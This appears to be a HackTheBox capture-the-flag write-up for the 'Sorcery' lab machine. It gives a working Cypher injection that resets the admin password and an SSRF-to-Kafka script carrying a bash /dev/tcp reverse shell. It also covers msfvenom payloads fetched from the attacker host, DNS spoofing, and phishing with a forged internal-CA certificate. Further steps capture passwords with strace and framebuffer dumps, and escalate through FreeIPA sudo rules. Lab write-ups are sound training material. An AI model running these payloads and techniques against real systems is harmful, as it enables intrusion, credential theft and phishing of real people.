
# 🧙 Sorcery HTB Write-Up

---

##  **🔍 Machine Information**

**Machine Name**: Sorcery 

**Difficulty**: Insane 

**Platform**: Linux

```bash
echo "10.10.11.67 git.sorcery.htb sorcery.htb" | sudo tee -a /etc/hosts
```

---

## Full Exploitation Path

---

### **Nmap Scan**

```bash
nmap -sC -sV $MachineIP -oN nmap/recon.nmap
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-14 16:33 CDT
Nmap scan report for $MachineIP

Host is up (0.17s latency).

Not shown: 998 closed tcp ports (reset)

PORT    STATE SERVICE  VERSION

22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 

|   256 79:93:55:91:2d:1e:7d:ff:f5:da:d9:8e:68:cb:10:b9 (ECDSA)

|_  256 97:b6:72:9c:39:a9:6c:dc:01:ab:3e:aa:ff:cc:13:4a (ED25519)

443/tcp open  ssl/http nginx 1.27.1

|_http-server-header: nginx/1.27.1

| tls-alpn: 

|   http/1.1

|   http/1.0

|_  http/0.9

| ssl-cert: Subject: commonName=sorcery.htb

| Not valid before: 2024-10-31T02:09:11

|_Not valid after:  2052-03-18T02:09:11

|_http-title: Did not follow redirect to https://sorcery.htb/

|_ssl-date: TLS randomness does not represent time

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:

OS:SCAN(V=7.94SVN%E=4%D=6/14%OT=22%CT=1%CU=39227%PV=Y%DS=2%DC=T%G=Y%TM=684D

OS:EAE4%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=108%TI=Z%CI=Z%TS=A)SEQ(S

OS:P=108%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW

OS:7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%

OS:W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552N

OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=

OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A

OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4

OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=

OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)



Network Distance: 2 hops

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



TRACEROUTE (using port 587/tcp)

HOP RTT       ADDRESS

1   173.39 ms 10.10.14.1

2   173.53 ms 10.10.11.67



OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 38.93 seconds

```

### **Web Enumeration**

```bash
curl -I -k https://sorcery.htb
```

```
HTTP/1.1 307 Temporary Redirect

Server: nginx/1.27.1

Date: Sun, 15 Jun 2025 07:08:47 GMT

Content-Type: text/html; charset=utf-8

Connection: keep-alive

Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Accept-Encoding

link: </_next/static/media/a34f9d1faa5f3315-s.p.woff2>; rel=preload; as="font"; crossorigin=""; type="font/woff2"

Location: /auth/login

X-Powered-By: Next.js

Cache-Control: private, no-cache, no-store, max-ag
```

```bash
curl -k -I https://sorcery.htb/auth/login
```

```
HTTP/1.1 200 OK

Server: nginx/1.27.1

Date: Sun, 15 Jun 2025 07:09:23 GMT

Content-Type: text/html; charset=utf-8

Content-Length: 12263

Connection: keep-alive

Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Accept-Encoding

x-nextjs-cache: HIT

X-Powered-By: Next.js

Cache-Control: s-maxage=31536000, stale-while-revalidate

```



### **Initial Access via Cypher Injection**

- **Target**: `/dashboard/store/[product_id]`
- **Method**: Cypher injection (NoSQL/GraphQL) to modify admin password
- **Action**: Change admin's password and log in
- **NOTE**: Use Chromium browser

On visiting the website, we are met with a login page.

![image](https://github.com/user-attachments/assets/96c76334-f89a-432a-bbbd-697020458170)

We register an account, and login and take note of the repo.

We visit the git repo and inspect it, where we find critical information

![image](https://github.com/user-attachments/assets/be40fe10-251d-456d-b2f1-ac4ed4f8ab38)![image](https://github.com/user-attachments/assets/9f6584a0-b2c4-4687-a30f-9f4752af7390)

From the headers, cookies and repo wan confirm that we are dealing with a Neo4j backend using Rust bindings (`neo4rs`). The function `query(...)` is probably fed directly with user input (product UUID) **without parameterization**. 

An excellent resource can be found here:`https://pentester.land/blog/cypher-injection-cheatsheet/`

We can try injection on the /dashboard/store/\<production-id>{payload}

And on running payload...

```bash
" }) RETURN 1 //
```

And URL encode it:

```url
%22%20%7D%29%20RETURN%201%20%2F%2F
```

![image](https://github.com/user-attachments/assets/603d3334-8ace-4f13-a69f-84260ad42a05)

This confirms either:

- The injection **broke the Cypher query** — a syntax or execution error OR
- The backend **attempted to parse or execute it** but failed mid-query OR
- We likely **bypassed input validation**, but hit a **Cypher syntax error**

Since we have confirmed this from the backend source:
```rust
use argon2::{Argon2, PasswordHasher};
...
pub fn create_hash(password: &String) -> Result<String, AppError>

```

We  generate an argon2 hash and update the admin password.

```bash
echo -n 'MyNewPassword123!' | argon2 $(openssl rand -base64 16) -id -t 2 -m 14 -p 1
```

We then use the following payload:

```
"}) WITH result MATCH (u:User {username: 'admin'}) SET u.password = '$argon2id$v=19$m=16384,t=2,p=1$L0drOXVXT1A3R1NIb2x3UlljZHUvUT09$oH1IuQ0Klc8wdKa9k9pg1TvojQA9rqMCuVZ7KRqQHMA' RETURN result {.*, description: 'admin password updated'} //
```

We URL encode and visit the injected payload:
```url
https://sorcery.htb/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7D%29%20WITH%20result%20MATCH%20%28u%3AUser%20%7Busername%3A%20%27admin%27%7D%29%20SET%20u.password%20%3D%20%27%24argon2id%24v%3D19%24m%3D16384%2Ct%3D2%2Cp%3D1%24L0drOXVXT1A3R1NIb2x3UlljZHUvUT09%24oH1IuQ0Klc8wdKa9k9pg1TvojQA9rqMCuVZ7KRqQHMA%27%20RETURN%20result%20%7B.%2A%2C%20description%3A%20%27admin%20password%20updated%27%7D%20%2F%2F
```

And voila!

![image](https://github.com/user-attachments/assets/ce86ec5d-a45a-41f3-9182-07604ff69aef)


On exploring the web site as admin, we notice that most things are disabled for passkey.

![image](https://github.com/user-attachments/assets/90e114a9-bd13-4385-b32c-6f814b98b55d)


---

### **Passkey Setup**
- After admin login:
  - Add a passkey (WebAuthn) - Setup virtual passkey using chromium
  
  - Enable virtual authenticator and setup as follows
  
    ![image](https://github.com/user-attachments/assets/a9af2102-1e43-49e6-9570-00f069e79a5c)
![image](https://github.com/user-attachments/assets/d92dc934-2196-4b45-b625-9728385c430a)
  
  
  - We then set passkey in the profile page
  
  - Log out and log back in using the passkey
  
- This grants access to `/dashboard/debug`

![image](https://github.com/user-attachments/assets/293afb49-2e4f-412e-8f23-d62bddabefd7)


---

### **SSRF Exploitation**
#### **Objective**

- Exploit **SSRF (Server-Side Request Forgery)** via the `/dashboard/debug` endpoint.
- Use the internal access of the **admin panel** to communicate with **internal services** — in this case, `kafka:9092`.

#### **Target: Kafka**

- Kafka is running inside the Docker network and **not exposed externally**, but SSRF lets you reach it.
- Internal hostname `kafka` resolves inside the container network (as defined in `docker-compose.yml`).

##### **Payload**

```python
import struct, zlib, binascii

topic = b"update"
value = b"bash -c 'bash -i >& /dev/tcp/10.10.XX.XX/4443 0>&1'"

def msg(v):
    body = struct.pack(">BBi", 0, 0, -1) + struct.pack(">i", len(v)) + v
    crc = zlib.crc32(body) & 0xffffffff
    return struct.pack(">i", crc) + body


mset  = struct.pack(">q", 0) + struct.pack(">i", len(msg(value))) + msg(value)
pdata = struct.pack(">i", 0) + struct.pack(">i", len(mset)) + mset
tdata = struct.pack(">h", len(topic)) + topic + struct.pack(">i", 1) + pdata
body  = struct.pack(">h", 1) + struct.pack(">i", 10000) + struct.pack(">i", 1) + tdata
hdr   = struct.pack(">hhih", 0, 0, 42, 3) + b"dbg"
pkt   = struct.pack(">i", len(hdr) +len(body)) + hdr + body
print(binascii.hexlify(pkt).decode())
```

#### **Payload Strategy**

Kafka accepts **binary protocol messages**. To execute commands via Kafka:

1. **Topic:** `update` – the application listens to this topic.

2. **Message:** a command like:

   ```bash
   bash -c 'bash -i >& /dev/tcp/10.10.XX.XX/4443 0>&1'
   ```

   - This opens a reverse shell to your listener.

We're crafting a **valid Kafka "produce" request** in binary format.

##### 1. **`msg(value)`**

Encodes the command payload with:

- Magic byte
- Attributes
- CRC32 for integrity

##### 2. **`mset`**

Encodes a **MessageSet** with offset and message size.

##### 3. **`pdata` and `tdata`**

Wrap the message into Kafka's **produce request** format:

- Topic name
- Partition count
- Partition data

##### 4. **`body` + `hdr` + `pkt`**

- `hdr`: Kafka protocol headers (API key = 0 for produce)
- `body`: Encoded payload
- `pkt`: Final request sent over TCP

#### Output

The `binascii.hexlify(pkt)` gives you a hex string you can input into the debug tool’s **data field**.

------

#### **Result**

If successful, the application will:

- Use Kafka to forward the `update` command
- Another internal service (e.g., `dns`) listens and executes it
- Our netcat listener gets a **reverse shell**

![image](https://github.com/user-attachments/assets/60358e3e-ee64-40e9-ba79-01a8a0a08095)


- Note: you can change `...'sh -c...' or ...'/bin/bash -c...'` if script fails

- We fill in the boxes and start our listener:

![image](https://github.com/user-attachments/assets/2033e03c-9d2d-4b71-8501-d8aeaa38c240)


- And we receive a connection:

![image](https://github.com/user-attachments/assets/b08bf05e-0e0a-4414-8492-e1247944bb4d)


---

### **Phishing Setup**

Let's explore the blog:

​					   ![image](https://github.com/user-attachments/assets/75c706f0-bc76-4103-9fa0-50f01c87f16b)


From the blog, we learn that:

- The org checks **subdomain** names, **HTTPS**, and **internal CA**

- The **internal root CA’s private key** is stored on the **FTP server**

- **Tom has already fallen for phishing once**

- We will target tom_summers with phishing

#### **DNS Manipulation**

Now that you have a shell on the **DNS container** (via Kafka SSRF and reverse shell):

1. **We control how internal clients resolve `\*.sorcery.htb`**
   - `dnsmasq` on the DNS container is the internal resolver
   - Employees resolve domains like `dev.sorcery.htb` through it
2. **By modifying `/dns/hosts-user`**, we can **spoof a legitimate internal subdomain** to point to our machine.

```bash
cd /dns
echo "10.10.XX.XX dev.sorcery.htb" >> /dns/hosts-user   # Adds a fake DNS record
./convert.sh   # Rebuilds the DNS cache files from hosts-user and converts for dnsmasq to understand
pkill -9 dnsmasq # Forces dnsmasq to reload the updated configuration 
```

---

### **Tunnelling**

Explaining this concept is out of scope

- Create a payload and upload it to reverse shell connection

```bash
# Attacker
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$tun0IP LPORT=4443 -f elf -o payload
# Victim
python3 -c "import urllib.request; open('payload', 'wb').write(urllib.request.urlopen('http://10.10.XX.XX/payload').read())"
```

- Configuring and starting multi/handler

```bash
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 4443
lport => 4443
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 0.0.0.0:4443
```

- Executing the Payload on the Pivot Host

```bash
chmod +x payload
./payload &
```

- Configure MSF's SOCKS Proxy

```bash
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 1.

[*] Starting the SOCKS proxy server
```

- Adding a line in /etc/proxychains.conf if needed

```bash
nano /etc/proxychains4.conf
# Add at the end
socks4 127.0.0.1 9050
```

- Creating routes with autoroute

```bash
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > run
[*] Running module against 172.19.0.5
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.19.0.0/255.255.0.0 from host's routing table.
[*] Post module execution completed
```



---

#### **Credential Phishing**
- Use FTP to retrieve Root CA certs

```bash
# DNS Container FTP IP
getent hosts ftp
# Attacker machine
# Retrieve certs
proxychains -q ftp 172.19.0.3 # Anonymous login allowed
ftp> ls
ftp> cd pub
ftp> prompt off
ftp> mget *
```

![image](https://github.com/user-attachments/assets/f750465d-8254-4899-80e0-83d2af7e4185)


- Next we register our subdomain with the certificate

```bash
# This time we are lucky but we can use pem2john or openssl2john or similar tools
openssl rsa -in RootCA.key -out RootCA-unenc.key  # Password `password`
# Certify our subdomain
# Create private key
openssl genrsa -out dev.sorcery.htb.key 2048
# Create certificate signing request (CSR)
openssl req -new -key dev.sorcery.htb.key -out dev.sorcery.htb.csr -subj "/CN=dev.sorcery.htb"
# Sign the CSR with the internal CA
openssl x509 -req -in dev.sorcery.htb.csr -CA RootCA.crt -CAkey RootCA-unenc.key -CAcreateserial -out dev.sorcery.htb.crt -days 365
# Combine key and cert into one PEM file
cat dev.sorcery.htb.key dev.sorcery.htb.crt > dev.sorcery.htb.pem
```



- Set up HTTPS server or `mitmproxy`

```bash
mitmproxy --mode reverse:https://git.sorcery.htb --certs dev.sorcery.htb.pem --save-stream-file traffic.raw -k -p 443
```

- Send phishing link via mail server access

```bash
# Get DNS Container Mail IP
getent hosts mail
# Attacker Machine
# Send phishing email
proxychains -q swaks --to tom_summers@sorcery.htb --from nicole_sullivan@sorcery.htb --server MAILDOCKERIP --port 1025 --data "Subject: Hello Tom

Hi Tom,

Please check this link: https://dev.sorcery.htb/user/login
"
```

- We see that tom clicks on our phishing and we get his credential

![image](https://github.com/user-attachments/assets/9d7aa5d9-01ef-42bc-9300-5b9120dbec01)

![image](https://github.com/user-attachments/assets/68de5dba-d4cd-4408-83af-ada6a5a5dfa1)

---

## **Lateral Movement**

##### SSH as `tom_summers`

```bash
cat user.txt
cat /etc/passwd | grep "bash" | cut -d ":" -f 1
root
user
vagrant
tom_summers
tom_summers_admin
rebecca_smith
```

##### **Linpeas Enumeration**

```bash
curl -iL http://$tun0IP:8080/linpeas.sh | bash
```

Linpeas highlights this as high potential

```bash
tom_sum+    1517  0.0  0.7 227012 60800 ?        S    12:42   0:00 /usr/bin/Xvfb :1 -fbdir /xorg/xvfb -screen 0 512x256x24 -nolisten local
```

And as we can see, it is being run by tom_sum+ which could be tom_summers/tom_summers_admin

Consequently, we find a cronjob that user tom_summers_admin runs that connects to the above finding
```bash 
/provision/cron/tom_summers_admin/text-editor.sh
# Which launches
/usr/bin/mousepad /provision/cron/tom_summers_admin/passwords.txt
# but we can't read either
```

**`Xvfb`** = X Virtual Framebuffer, a display server that renders graphical applications without a physical display.

It’s being run **under `tom_summers`**, but note:

- The `-fbdir /xorg/xvfb` flag saves screen **framebuffer dumps** to that directory.
- If the cron job for `tom_summers_admin` opens a GUI app (like `mousepad`), its display might be routed through this Xvfb instance.
- If so, one might be able to **screenshot the admin’s desktop session** (including GUI password files or sensitive apps like `mousepad`).

```bash
# Exploitation Steps
ls -l /xorg/xvfb
# Attacker Machine
scp tom_summers@sorcery.htb:/xorg/xvfb/Xvfb_screen0 .
xwud -in Xvfb_screen0
```
![image](https://github.com/user-attachments/assets/c3e29b99-166a-428a-ac7a-93c9c3826cd2)

---

##### SSH as `tom_summers_admin`
```bash
sudo -l
Matching Defaults entries for tom_summers_admin on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User tom_summers_admin may run the following commands on localhost:
    (rebecca_smith) NOPASSWD: /usr/bin/docker login
    (rebecca_smith) NOPASSWD: /usr/bin/strace -s 128 -p [0-9]*
```

- Attack chain for rebeca_smith

We will be doing  **command tracing with `strace` and privilege abuse**, allowing us to hijack **sensitive input** (like credentials) from a process we wouldn't normally be allowed to inspect. `strace` can log **all system calls** of a running process. It also captures **arguments** passed to system calls — including strings written to files or input streams. `-s 128` lets it capture strings up to 128 chars long (like passwords).

Docker login asks for Docker Hub username and password and internally, sends that info to STDIN or calls something like read() → strace can capture this.

```bash
nano trace_rebecca.sh

#### trace_rebecca.sh
USER="rebecca_smith"
COMMAND="docker login"

declare -A traced_pids

while true; do
    # Find all docker login pids for user that are NOT traced yet
    pids=$(pgrep -u $(id -u $USER) -f "$COMMAND")
    
    for pid in $pids; do
        if [[ -z "${traced_pids[$pid]}" ]]; then
            echo "Attaching strace to PID $pid"
            # Run strace in background, detach, with large string size and follow forks (in case supported)
            sudo -u $USER strace -s 128 -p $pid -o /tmp/strace-$pid.log &
            traced_pids[$pid]=1
        fi
    done

    # Check child processes of traced pids
    for parent_pid in "${!traced_pids[@]}"; do
        # List child pids of parent_pid
        child_pids=$(pgrep -P $parent_pid)
        for child_pid in $child_pids; do
            if [[ -z "${traced_pids[$child_pid]}" ]]; then
                echo "Attaching strace to child PID $child_pid (parent $parent_pid)"
                sudo -u $USER strace -s 128 -p $child_pid -o /tmp/strace-$child_pid.log &
                traced_pids[$child_pid]=1
            fi
        done
    done

done
## Save, change permissions and execute
chmod +x trace_rebecca.sh
./trace_rebecca.sh &
```

- Different tom_summers_admin ssh session

```bash
sudo -u rebecca_smith /usr/bin/docker login
cat /tmp/strace-* | grep rebecca
```

![image](https://github.com/user-attachments/assets/e45d65aa-64e0-4a13-8ecf-fc11ca76f561)

---

##### SSH as `rebecca_smith`
We try docker login again but it requires otp. For that, we can run **`pspy64` in the background** to catch any OTPs being generated or read. Then login again.

```bash
 ./pspy64 | grep -iE "7eAZDp9" &
 # Watch for the otp and login
 docker login 127.0.0.1:5000
```

![image](https://github.com/user-attachments/assets/48a9211c-95ae-4005-b4fd-73da713211bb)


##### **Enumerating Docker Registry**

```bash
# List repositories
curl -s -u rebecca_smith:'-7eAZDp9-f9mg699914' http://127.0.0.1:5000/v2/_catalog
# List tags for each repository
curl -s -u rebecca_smith:'-7eAZDp9-f9mg699914' http://127.0.0.1:5000/v2/test-domain-workstation/tags/list
# Get a manifest for the image
curl -s -u rebecca_smith:'-7eAZDp9-f9mg699914' \
  http://127.0.0.1:5000/v2/test-domain-workstation/manifests/latest
```

![image](https://github.com/user-attachments/assets/3069e644-1cbe-4547-89ea-b72909cac4a0)


- **Next we download the blobs**

  ```bash
  nano blobs.sh
  
  #!/bin/bash
  
  # Credentials
  USER="rebecca_smith"
  PASS="-7eAZDp9-f9mg659549" # Change this
  
  # Repository and list of blobs (edit this as new blobs appear)
  REPO="test-domain-workstation"
  BLOBS=(
      "a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      "292e59a87dfb0fb3787c3889e4c1b81bfef0cd2f3378c61f281a4c7a02ad1787"
      "bff382edc3a6db932abb361e3bd5aa09521886b0b79792616fc346b19a9497ea"
      "92879ec4738326a2ab395b2427c2ba16d7dcf348f84477653a635c86d0146cb7"
      "802008e7f7617aa11266de164e757a6c8d7bb57ed4c972cf7e9f519dd0a21708"
  )
  
  mkdir -p blobs
  
  for BLOB in "${BLOBS[@]}"; do
    echo "[*] Downloading blob $BLOB"
    curl -s -u "$USER:$PASS" \
      -o blobs/$BLOB.tar \
      "http://127.0.0.1:5000/v2/$REPO/blobs/sha256:$BLOB"
  done
  
  # Save, change perms, exec
  chmod +x blob.sh
  ./blob.sh
  # Let's kill pspy64 now
  fg
  Ctrl+C
  ```

- **Extract and search**

```bash
mkdir extracted
for BLOB in blobs/*.tar; do
  mkdir -p extracted/${BLOB##*/}
  tar -xf "$BLOB" -C extracted/${BLOB##*/}
done

# Search for juicy strings (like passwords, secrets, SSH keys, scripts)
grep -rniE 'pass|secret|key|token|flag|user' extracted 2>/dev/null
```

![image](https://github.com/user-attachments/assets/02b77845-2a71-4a1c-98fb-8f49d56c624f)


And we find our selves another user.

- **Principal (username):** `donna_adams`

- **Password:** `**********`

```bash
ssh donna_adams@main
```

---

### **DC01 Enumeration**

```bash
$ kinit donna_adams
$ klist
Ticket cache: KEYRING:persistent:1638400003:krb_ccache_2v99LPK
Default principal: donna_adams@SORCERY.HTB

Valid starting     Expires            Service principal
06/18/25 23:34:09  06/19/25 22:56:54  krbtgt/SORCERY.HTB@SORCERY.HTB
```

#### **What is `kinit`?**

- `kinit` gets a **Kerberos ticket-granting ticket (TGT)** for a user.
- It authenticates you once (with the password), then you can use that ticket to access other services **without re-entering the password**.
- Tickets are cached locally (check with `klist`)

```bash
$ ldapsearch -Y GSSAPI -b "dc=sorcery,dc=htb" "(uid=donna_adams)"
<SNIP>
memberOf: cn=ipausers,cn=groups,cn=accounts,dc=sorcery,dc=htb
memberOf: cn=change_userPassword_ash_winter_ldap,cn=roles,cn=accounts,dc=sorce
 ry,dc=htb
memberOf: cn=change_userPassword_ash_winter_ldap,cn=privileges,cn=pbac,dc=sorc
 ery,dc=htb
memberOf: cn=change_userPassword_ash_winter_ldap,cn=permissions,cn=pbac,dc=sor
 cery,dc=htb
memberOf: ipaUniqueID=c4f41b80-96eb-11ef-9cbc-0242ac170002,cn=hbac,dc=sorcery,
 dc=htb
memberOf: ipaUniqueID=c54549ba-96eb-11ef-9408-0242ac170002,cn=hbac,dc=sorcery,
 dc=htb
<SNIP>
```

**This suggests donna_adams may be able to change the LDAP password for another user:**
 **ash_winter**

Let's see if we can reset `ash_winter`'s password

```bash
# Here’s an example LDIF file (replace NEWPASS):

dn: uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb
changetype: modify
replace: userPassword
userPassword: NEWPASS

# Run:

ldapmodify -Y GSSAPI -f change.ldif

# Followed immediately by

ssh ash_winter@main

# Change password
```

![image](https://github.com/user-attachments/assets/df0e93f3-7d01-4924-ba6c-261dda2d24ed)


- We’ve just abused delegated LDAP access to take over another account.

- **`ipa passwd` / `ldappasswd`**: Try to *change* the password the "official" way, but require both privilege and correct method/overlay.
- **`ldapmodify`**: *Edits* the `userPassword` attribute directly, if you have write permissions—sometimes possible even if the "official" way is blocked!

---

## **Privilege Escalation**

### **Ash_winter's membership**

```bash
$ ldapsearch -Y GSSAPI -b "dc=sorcery,dc=htb" "(uid=ash_winter)"     
<SNIP>
krbCanonicalName: ash_winter@SORCERY.HTB
ipaUniqueID: c862fa48-96eb-11ef-9f47-0242ac170002
uidNumber: 1638400004
gidNumber: 1638400004
ipaNTSecurityIdentifier: S-1-5-21-820725746-4072777037-1046661441-1004
memberOf: cn=ipausers,cn=groups,cn=accounts,dc=sorcery,dc=htb
memberOf: cn=add_sysadmin,cn=roles,cn=accounts,dc=sorcery,dc=htb
memberOf: cn=add_sysadmin,cn=privileges,cn=pbac,dc=sorcery,dc=htb
memberOf: cn=add_sysadmin,cn=permissions,cn=pbac,dc=sorcery,dc=htb
memberOf: ipaUniqueID=c4f41b80-96eb-11ef-9cbc-0242ac170002,cn=hbac,dc=sorcery,
 dc=htb
memberOf: ipaUniqueID=c54549ba-96eb-11ef-9408-0242ac170002,cn=hbac,dc=sorcery,
 dc=htb
 <SNIP>
```

The **key finding** here is that `ash_winter` is a member of:

- **add_sysadmin** (role/privilege/permission)

```bash
$ sudo -l
$ id

# Add to sysadmins
$ id
uid=1638400004(ash_winter) gid=1638400004(ash_winter) groups=1638400004(ash_winter)
$ ipa group-add-member sysadmins --users=ash_winter;exit
  Group name: sysadmins
  GID: 1638400005
  Member users: ash_winter
  Indirect Member of role: manage_sudorules_ldap
-------------------------
Number of members added 1
-------------------------
# Re-login
$ id
uid=1638400004(ash_winter) gid=1638400004(ash_winter) groups=1638400004(ash_winter),1638400005(sysadmins)

# Add to allow_sudo role
$ ipa sudorule-add-user allow_sudo --users=ash_winter;exit
  Rule name: allow_sudo
  Enabled: True
  Host category: all
  Command category: all
  RunAs User category: all
  RunAs Group category: all
  Users: admin, ash_winter
-------------------------
Number of members added 1
-------------------------
# Re-login again
$ sudo /usr/bin/systemctl restart sssd;exit

# Re-login
```

![image](https://github.com/user-attachments/assets/502e7115-92a8-449b-ba25-319981dbea65)


- The possibilities are endless. 

```bash
sudo su
```

![image](https://github.com/user-attachments/assets/2e079a07-b848-4cf7-b06d-0fab0b9d7e96)

# 			

# 			   		***THE* *END***

